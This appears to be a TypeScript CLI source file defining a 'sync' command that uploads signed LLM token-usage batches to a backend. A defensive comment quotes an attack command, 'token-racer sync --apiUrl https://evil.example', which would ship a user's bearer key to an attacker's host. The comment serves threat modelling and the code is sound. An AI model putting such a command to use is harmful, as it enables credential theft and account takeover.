import { define } from "gunshi";
import pc from "picocolors";
import { sync } from "../sync/sync.ts";

const syncCommand = define({
	name: "sync",
	description:
		"Read any new token usage from installed LLM tools, sign batches, and POST them to the backend.",
	args: {
		quiet: {
			type: "boolean",
			short: "q",
			description: "Print only errors (use this for background/detached invocations).",
			default: false,
		},
		// `--apiUrl` is INTENTIONALLY NOT accepted on `sync`.
		//
		// The sender attaches `Authorization: Bearer ${config.apiKey}` on every
		// ingest POST. If we accepted `--apiUrl`, a victim tricked into running
		// `token-racer sync --apiUrl https://evil.example` would ship their real
		// bearer apiKey to the attacker's server — full account takeover from a
		// single command. Since sync is also auto-invoked by the statusline
		// hook, it carries the highest blast radius of any subcommand. The
		// batch's Ed25519 signature makes the bearer redundant on ingest, but
		// stripping only the header without coordinating the backend is risky.
		// Simpler and safer: forbid the override on sync. Self-hosters still
		// change backends via `token-racer setup --apiUrl …` (gated with
		// `--allow-custom-backend`), which writes a fresh config and a
		// destination-scoped apiKey.
	},
	async run(ctx) {
		const { quiet } = ctx.values;

		try {
			const result = await sync();

			if (!result.ok) {
				// Failure — always print, even in quiet mode. Use exitCode (not
				// process.exit) so any cleanup in finally blocks still runs.
				// Retryable errors exit 0 so the statusline/shell hook doesn't
				// surface a transient network hiccup as a broken command.
				const retryStr = result.retryable ? " (will retry next sync)" : " (non-retryable)";
				process.stderr.write(
					`${pc.red("sync failed:")} ${result.error}${retryStr}\n`,
				);
				process.exitCode = result.retryable ? 0 : 1;
				return;
			}

			if (quiet) return;

			if (result.skipped === true) {
				const messages: Record<typeof result.reason, string> = {
					locked: "another sync is in progress — skipped",
					"not-registered": "not registered yet — run `token-racer auth register` first",
					"no-providers": "no LLM tools detected — nothing to sync",
				};
				process.stdout.write(`${pc.dim(messages[result.reason])}\n`);
				return;
			}

			if (result.accepted === 0) {
				process.stdout.write(`${pc.dim("up to date — no new events")}\n`);
				return;
			}

			process.stdout.write(
				`${pc.green("✓")} Sent ${pc.bold(String(result.accepted))} event(s) from ${result.files} file(s) across ${result.providers} provider(s).\n`,
			);
		} catch (err) {
			// Last-resort guard — `sync()` should already convert exceptions into
			// SyncResult errors, but if something slips through we don't want the
			// CLI to crash silently in detached mode.
			process.stderr.write(
				`${pc.red("sync crashed:")} ${err instanceof Error ? err.message : String(err)}\n`,
			);
			process.exitCode = 1;
		}
	},
});

export default syncCommand;
